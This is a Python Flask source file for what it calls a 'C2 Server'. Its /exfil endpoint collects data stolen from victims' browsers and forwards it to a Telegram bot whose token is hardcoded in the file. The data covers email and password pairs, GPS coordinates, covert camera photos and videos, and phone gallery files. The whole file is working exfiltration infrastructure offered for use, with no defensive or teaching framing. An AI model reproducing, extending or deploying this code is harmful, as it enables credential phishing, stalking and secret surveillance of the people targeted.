from flask import Flask, request, jsonify
import requests
import json
import base64
import os
import csv
import re
from datetime import datetime

app = Flask(__name__)

# ===== YOUR CONFIG =====
TELEGRAM_TOKEN = "8440979863:AAE8OS_UzuvJV6T-sEqC9PuO0TvNUNapur8"
TELEGRAM_CHAT_ID = "8204622013"
# =======================

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        if len(message) > 4000:
            for i in range(0, len(message), 4000):
                chunk = message[i:i+4000]
                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=5)
        else:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=5)
        print("[✓] Forwarded to Telegram")
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def send_file_to_telegram(file_path, caption=""):
    """Send a file to Telegram as a document"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
            if response.status_code == 200:
                print(f"[✓] File sent to Telegram: {file_path}")
            else:
                print(f"[!] Failed to send file: {response.text}")
        return True
    except Exception as e:
        print(f"[!] Error sending file: {e}")
        return False

@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Accept, X-Requested-With'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/exfil', methods=['GET', 'POST', 'OPTIONS'])
def exfil():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        if request.method == 'GET':
            data = request.args.to_dict()
        elif request.is_json:
            data = request.get_json(force=True, silent=True) or {}
        else:
            data = request.form.to_dict() or {'raw': request.data.decode('utf-8', errors='ignore')}
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        data['ip'] = ip
        data['timestamp'] = datetime.now().isoformat()
        
        data_type = data.get('type', 'unknown')
        print(f"[+] Data: {data_type} from {ip}")
        
        # === CREDENTIALS ===
        if data_type == 'credentials':
            email = data.get('email', '')
            password = data.get('pass', '')
            send_telegram(f"🔐 <b>Credentials</b>\n📧 {email}\n🔑 {password}\n🌐 IP: {ip}")
            return jsonify({"status": "OK"}), 200
        
        # === LOCATION ===
        if data_type == 'location':
            lat = data.get('lat')
            lon = data.get('lon')
            msg = f"📍 <b>Location</b>\n🗺️ Lat: {lat}\n🗺️ Lon: {lon}\n🔗 https://www.google.com/maps?q={lat},{lon}"
            send_telegram(msg)
            return jsonify({"status": "OK"}), 200
        
        # === PHOTO ===
        if data_type == 'photo':
            raw = data.get('data', '')
            camera = data.get('camera', 'unknown')
            if raw:
                filename = f"{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(raw))
                send_file_to_telegram(filename, f"📸 Photo ({camera} camera)\nIP: {ip}")
                os.remove(filename)
                print(f"[✓] Photo forwarded to Telegram")
            return jsonify({"status": "OK"}), 200
        
        # === VIDEO ===
        if data_type == 'video':
            raw = data.get('data', '')
            camera = data.get('camera', 'front')
            if raw:
                filename = f"{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(raw))
                send_file_to_telegram(filename, f"🎥 Video ({camera} camera)\nIP: {ip}")
                os.remove(filename)
                print(f"[✓] Video forwarded to Telegram")
            return jsonify({"status": "OK"}), 200
        
        # === GALLERY FILE ===
        if data_type == 'media_file':
            filename = data.get('filename', 'unknown')
            filepath = data.get('path', '')
            raw = data.get('data', '')
            if raw:
                safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
                with open(safe_name, 'wb') as f:
                    f.write(base64.b64decode(raw))
                send_file_to_telegram(safe_name, f"📁 Gallery file\n📄 {filename}\n📂 {filepath}")
                os.remove(safe_name)
                print(f"[✓] Gallery file forwarded: {filename}")
            return jsonify({"status": "OK"}), 200
        
        # === MEDIA COMPLETE ===
        if data_type == 'media_extraction_complete':
            count = data.get('count', 0)
            send_telegram(f"✅ Gallery extraction complete: {count} files")
            return jsonify({"status": "OK"}), 200
        
        # === TEST ===
        if data_type == 'test':
            msg = data.get('message', 'No message')
            send_telegram(f"🧪 Test message: {msg}")
            return jsonify({"status": "OK", "message": "Test received"}), 200
        
        # === DEFAULT ===
        send_telegram(f"📨 Data\n{json.dumps(data, indent=2)[:2000]}")
        return jsonify({"status": "OK"}), 200
        
    except Exception as e:
        error_msg = str(e)
        print(f"[!] Error: {error_msg}")
        send_telegram(f"[!] Server error: {error_msg}")
        return jsonify({"status": "ERROR", "message": error_msg}), 500

@app.route('/ping', methods=['GET', 'OPTIONS'])
def ping():
    if request.method == 'OPTIONS':
        return '', 200
    return jsonify({"status": "PONG"}), 200

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "C2 Server Running"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"🚀 C2 Server Running on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)
